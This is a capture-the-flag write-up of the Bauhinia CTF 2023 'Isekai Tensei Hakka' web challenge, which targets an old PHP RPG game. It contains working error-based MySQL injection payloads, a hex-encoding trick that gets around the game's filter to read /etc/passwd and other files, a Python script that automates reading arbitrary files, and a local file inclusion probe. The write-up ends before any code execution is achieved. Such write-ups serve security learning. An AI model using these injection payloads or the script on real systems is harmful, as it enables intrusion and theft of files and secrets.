# Isekai Tensei Hakka

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)

## Overview

- 1 solve / 500 points
- Author: ozetta
- Overall difficulty for me (From 1-10 stars): ★★★★★★★★★★

## Background

**不死傳說**

> 若被傷害夠 就用一對手  
> 痛快的割開 昨日詛咒  
> 入夜等白晝 剩下傷痕開始結焦那胸膛  
> 城內 快要變作困獸鬥人人尋仇赤腳走

As we all know, CTFs are not good for our health. After burning the midnight oil for three days on the DeathCoin CTF, you die. You then reincarnate into a sword and magic world with a special skill called "Za Warudo no Sosukodo," because you complained that DeathCoin CTF did not release the source code of a web challenge before you died. Can you become the strongest Yuusha beyond the world?

Remarks:

- The world will be reborn every 30 minutes.
- The Yggdrasill did not grow any Pear.
- The "goddess" (♂) only granted you the source code with Isekai language (no, it is called Chinese) but not the Dockerfile. Maybe you should also complain that the CTF did not release the Dockerfile before you died again.

Isekai: [http://chall-us.pwnable.hk:8765](http://chall-us.pwnable.hk:8765) , [http://chall-hk.pwnable.hk:8765](http://chall-hk.pwnable.hk:8765)

Hint (2023-08-20 21:16; or +37h 16m): The "goddess" (♂) had listened to your pray and (s)he told you that the challenge requires RCE...

Za Warudo no Sosukodo: [isekai-tensei-hakka_315736d206849cd686a590965dbd3bc6.tar.gz](https://ctf.b6a.black/files/isekai-tensei-hakka_315736d206849cd686a590965dbd3bc6.tar.gz)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821103101.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821103255.png)

Right off the bat, I saw the bottom-left corner's copyright text: "**Online FF Battle - [WOG](http://bbs.2233.idv.tw/viewforum.php?f=36) V3 Copyright (C) [ETERNAL](http://www.2233.idv.tw)**". After some digging, it seems like this online RPG game (幻想戰爭Online) is dead and no longer be maintained?

Anyway, before you login to your character, you have to create a new one first (創造新角色):

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821104438.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821105435.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821105446.png)

After created, we can play the RPG game.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/Web/Isekai-Tensei-Hakka/isekai-tensei-hakka_315736d206849cd686a590965dbd3bc6.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Isekai-Tensei-Hakka)-[2023.08.21|10:58:47(HKT)]
└> file isekai-tensei-hakka_315736d206849cd686a590965dbd3bc6.tar.gz 
isekai-tensei-hakka_315736d206849cd686a590965dbd3bc6.tar.gz: gzip compressed data, was "wog3.tar", last modified: Tue Mar  7 03:08:40 2023, max speed, from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 2115072
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Isekai-Tensei-Hakka)-[2023.08.21|10:58:49(HKT)]
└> tar xf isekai-tensei-hakka_315736d206849cd686a590965dbd3bc6.tar.gz
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Isekai-Tensei-Hakka)-[2023.08.21|10:58:52(HKT)]
└> ls -alh wog3 
total 512K
drwxr-xr-x 7 siunam nam 4.0K Mar  6 22:18 .
drwxr-xr-x 3 siunam nam 4.0K Aug 21 10:58 ..
drwxr-xr-x 2 siunam nam 4.0K May 21  2006 class
drwxr-xr-x 3 siunam nam 4.0K May 21  2006 forum_support
drwxr-xr-x 5 siunam nam 4.0K Feb  6  2009 img
-rwxr-xr-x 1 siunam nam 1.8K May 23  2006 index.htm
drwxr-xr-x 2 siunam nam 4.0K May 21  2006 language
drwxr-xr-x 2 siunam nam  12K May 21  2006 mission
-rwxr-xr-x 1 siunam nam 5.1K May 21  2006 readme.txt
-rwxr-xr-x 1 siunam nam 258K May 29  2006 wog3_sql_utf8.sql
-rwxr-xr-x 1 siunam nam 6.3K May 21  2006 wog_act_config.php
-rwxr-xr-x 1 siunam nam  17K May 21  2006 wog_act.php
-rwxr-xr-x 1 siunam nam 4.6K May 21  2006 wog_chara_make.php
-rwxr-xr-x 1 siunam nam  154 May 21  2006 wog.css
-rwxr-xr-x 1 siunam nam   83 May 21  2006 wog_etc_king.htm
-rwxr-xr-x 1 siunam nam 3.4K May 21  2006 wog_etc.php
-rwxr-xr-x 1 siunam nam  771 May 21  2006 wog_faq2.htm
-rwxr-xr-x 1 siunam nam  12K May 21  2006 wog_faq.htm
-rwxr-xr-x 1 siunam nam 6.0K May 21  2006 wog_fight.php
-rwxr-xr-x 1 siunam nam 4.4K May 21  2006 wog_foot.htm
-rwxr-xr-x 1 siunam nam   61 May 21  2006 wog_id_admin.htm
-rwxr-xr-x 1 siunam nam 109K May 26  2006 wog.js
-rwxr-xr-x 1 siunam nam 2.1K May 21  2006 wog_s_kill.htm
-rwxr-xr-x 1 siunam nam 2.4K May 26  2006 wog_top.htm
```

Hmm... It seems like we downloaded the file is the source code of this online RPG game.

After reviewing the source code, I found that **almost all of the SQL queries don't have SQL injection protection**, like prepared statement.

So, I found an **error-based MySQL injection in `/wog_act.php`**.

**First, in `/wog_act_shop.php`, we can see the `buy()` method has tons of raw SQL queries (Sink, a dangerous function), and one of them has user controllable variable (Source, attacker's controllable value):**
```php
<?
[...]
class wog_act_shop{
    [...]
    check_type($_POST["temp_id"],1);
    [...]
    function buy($user_id)
    {
        [...]
        $check_tiem=$DB_site->query_first("select d_id from ".$temp["table"]." where d_id=".$_POST["adds"]."  and d_dbst=1");
        [...]
```

**The `query_first()` method is defined in `/forum_support/config/db_mysql.php`'s `DB_Sql_vb` class:**
```php
<?php
[...]
class DB_Sql_vb
{
    [...]
    function query_first($query_string, $type = DBARRAY_ASSOC)
    {
        // does a query and returns first row
        $query_id = $this->query($query_string);
        $returnarray = $this->fetch_array($query_id, $type);
        $this->free_result($query_id);
        $this->lastquery = $query_string;
        return $returnarray;
    }
    [...]
```

This method is to query the raw SQL query, and **only return the first record**.

But how can we trigger the `buy()` method?

**In `/wog_act.php`, we can provide POST parameter `f=shop` and `act=buy` to call method `buy()` from class `wog_act_shop`:**
```php
<?
[...]
//########################## switch case begin #######################
$a_id="";
$temp_ss="";
switch ($_POST["f"])
{
    [...]
    case "shop":
        include_once("./class/wog_item_tool.php");
        $wog_item_tool = new wog_item_tool;
        include("./class/wog_act_shop.php");
        $wog_act_class = new wog_act_shop;
        switch ($_POST["act"])
        {
            case "view":
                $wog_act_class->shop($HTTP_COOKIE_VARS["wog_cookie"]);
            break;
            case "buy":
                $wog_act_class->buy($HTTP_COOKIE_VARS["wog_cookie"]);
            break;
        }
        unset($wog_item_tool);
    break;
    [...]
```

**That being said, we should be able to exploit an error-based MySQL injection in `/wog_act.php`:**
```http
adds=--+-&f=shop&act=buy&temp_id=0
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821111740.png)

Nice! We successfully triggered an SQL syntax error!

**According to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based---updatexml-function), we can exfiltrate the database data!**
```http
adds=1+and+updatexml(null,concat(0x0a,version()),null)--+-&f=shop&act=buy&temp_id=0
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821112112.png)

But... What can we even exfiltrate from the database... There's no other players in this game... Hell, where's the flag?

**Hmm... Maybe the flag file is in the challenge instance's file system??**

**If so, we can try to read arbitrary files via `LOAD_FILE()` in MySQL:**
```http
adds=1+and+updatexml(null,concat(0x0a,(select+LOAD_FILE('/etc/passwd'))),null)--+-&f=shop&act=buy&temp_id=0
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821112424.png)

Wait... The request contains abnormal characters (有不正常符號)?

**Let's find that request filtering:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821112833.png)

**In  `/function.php`, we can see that function `post_check()` is using regular expression (Regex) to filter the incoming request:**
```php
<?
[...]
function post_check($post)
{
    global $HTTP_COOKIE_VARS;
    foreach ($post as $v) {
        if(is_array($v))
        {
            for($i=0;$i<count($v);$i++)
            {
                if(eregi("[<>'\";\]", $v[$i]))
                {
                    alertWindowMsg("有不正常符號(1)");
                }
            }
        }else
        {
            if(eregi("[<>'\";\]", $v))
            {
                alertWindowMsg("有不正常符號(1)");
            }
        }
    }
    if(isset($HTTP_COOKIE_VARS["wog_cookie"]))
    {
//      if(eregi("[<>'\";\]",$HTTP_COOKIE_VARS["wog_cookie"]))
        if(!is_numeric($HTTP_COOKIE_VARS["wog_cookie"]))
        {
            alertWindowMsg("有不正常符號(2)");
        }
    }
    if(isset($HTTP_COOKIE_VARS["wog_bbs_id"]))
    {
//      if(eregi("[<>'\";\]",$HTTP_COOKIE_VARS["wog_bbs_id"]))
        if(!is_numeric($HTTP_COOKIE_VARS["wog_bbs_id"]))
        {
            alertWindowMsg("有不正常符號(3)");
        }
    }
}
[...]
```

In 有不正常符號(1), it's validating the request contains `<>'";\` character by character. In 有不正常符號(2) and 有不正常符號(3), they're validating cookie `wog_cookie` and `wog_bbs_id` is a numeric value.

**To bypass the `<>'";\` filter, we can use hex encoding:**
```shell
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Isekai-Tensei-Hakka)-[2023.08.21|11:33:47(HKT)]
└> python3 
[...]
>>> filename = b'/etc/passwd'
>>> f'0x{filename.hex()}'
'0x2f6574632f706173737764'
```

```http
1+and+updatexml(null,concat(0x0a,(select+LOAD_FILE(0x2f6574632f706173737764))),null)--+-&f=shop&act=buy&temp_id=0
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821113504.png)

Nice! However, the file's content looks like is being **truncated**. To solve this we can use `substring()`:

```sql
1 and updatexml(null,concat(0x0a,(substring((select LOAD_FILE(<file_name_in_hex>)),1,31))),null)-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821113708.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821113723.png)

We can now read arbitrary files!

**To automate the above process, I wrote a not so beautiful Python script:**
```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import re

leakedContent = ''

def exploit(filename, position):
    global leakedContent
    filenameInHex = f'0x{filename.hex()}'
    sqlInjectionPayload = f'''1 and updatexml(null,concat(0x0a,(substring((select LOAD_FILE({filenameInHex})),{position},31))),null)-- -'''
    
    data = {
        'adds': sqlInjectionPayload,
        'f': 'shop',
        'act': 'buy',
        'temp_id': '0'
    }
    cookie = {
        'wog_cookie': '2',
        'wog_bbs_id': '1',
        'wog_cookie_debug': '22b53148583068af1f18ac2c126443f0'
    }

    errorMessage = b'mysql error: XPATH syntax error: \''
    response = requests.post(FULL_URI, data=data, cookies=cookie, stream=True)
    responseText = response.raw.read()

    if errorMessage not in responseText:
        print('[-] Exploit failed...')
        leakedContent = ''
        exit(0)

    soup = BeautifulSoup(responseText, 'html.parser')
    cleanResponseText = soup.text.strip()
    errorMessage = re.search(r'XPATH syntax error: \'\n(.+)\n?\'', cleanResponseText)
    if not errorMessage:
        leakedContent = ''
        return False

    leakedContent += errorMessage.group(1)
    return True

def checkFile(filename, position=1):
    filenameInHex = f'0x{filename.hex()}'
    sqlInjectionPayload = f'''1 and updatexml(null,concat(0x0a,(substring((select LOAD_FILE({filenameInHex})),{position},31))),null)-- -'''
    
    data = {
        'adds': sqlInjectionPayload,
        'f': 'shop',
        'act': 'buy',
        'temp_id': '0'
    }
    cookie = {
        'wog_cookie': '2',
        'wog_bbs_id': '1',
        'wog_cookie_debug': '22b53148583068af1f18ac2c126443f0'
    }

    errorMessage = b'mysql error: XPATH syntax error: \''
    response = requests.post(FULL_URI, data=data, cookies=cookie, stream=True)
    responseText = response.raw.read()

    print(f'[*] Trying file {filename.decode()}', end='\r')
    if errorMessage in responseText:
        print(f'\n[+] {filename.decode()} exist!')

if __name__ == '__main__':
    BASE_URI = 'http://chall-us.pwnable.hk:8765/'
    PHP_FILE = 'wog_act.php'
    FULL_URI = BASE_URI + PHP_FILE

    # for pid in range(1, 10000):
    #     filename = f'/proc/{pid}/cmdline'.encode()
    #     checkFile(filename)

    filename = b'<file_name_here>'
    for position in range(1, 100000, 31):
        isSuccess = exploit(filename, position)
        if isSuccess:
            print(leakedContent)
```

**Leaking `/etc/hosts` file:**
```shell
┌[siunam♥Mercury]-(~/ctf/Bauhinia-CTF-2023/Web/Isekai-Tensei-Hakka)-[2023.08.21|11:38:57(HKT)]
└> python3 leak_files.py
# Kubernetes-managed hosts file
host ip6-localhost ip6-loopback
42.0.83	chal20-isekai-tensei-ha
42.0.83	chal20-isekai-tensei-hakka-2.chal20.default.svc.cluste
42.0.83	chal20-isekai-tensei-hakka-2.chal20.default.svc.cluster.local	chal20-isekai-tensei-ha
```

But, I tried to guess where the flag is, like it is in environment variable and more. Unfortunately, no luck at all.

Then, I realized that this challenge should be finding an **RCE** (Remote Code Execution) vulnerability, and gain access to the challenge's instance. So, I started to look for other vulnerabilities.

> Note: I also tried to write arbitrary files via the SQL injection, but failed.

**In `/wog_act.php`, I also found somewhat LFI (Local File Inclusion) vulnerability:**
```php
<?
[...]
switch ($_POST["f"])
{
    [...]
    case "mission":
        [...]
        switch ($_POST["act"])
		{
    		[...]
    		case "end":
				include("./class/wog_item_tool.php");
				include("./class/wog_mission_tool.php");
				include("./mission/wog_mission_".$_POST["temp_id"].".php");
				$wog_item_tool= new wog_item_tool;
				$wog_mission_tool= new wog_mission_tool;
				mission_end($HTTP_COOKIE_VARS["wog_cookie"],$_POST["temp_id"]);
				unset($wog_item_tool);
				unset($wog_mission_tool);
			break;
			[...]
```

In here, we can see that **the POST parameter `temp_id` is controllable by user**.

**That being said, we should be about to include arbitrary files via `temp_id`:**
```http
f=mission&act=end&temp_id=blah
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821114759.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821115038.png)

**However, I wasn't able to bypass the `.php` extension via null byte (`%00`)...**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821115121.png)

Hmm... What can I do in this challenge...

**I also noticed that this challenge instance's Apache and PHP version is ancient old:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bauhinia-CTF-2023/images/Pasted%20image%2020230821115224.png)

I tried to research on the vulnerabilities in above versions, but there're way too many vulnerabilities, I have no idea which one we can leverage/chain the vulnerability we've found to gain RCE... 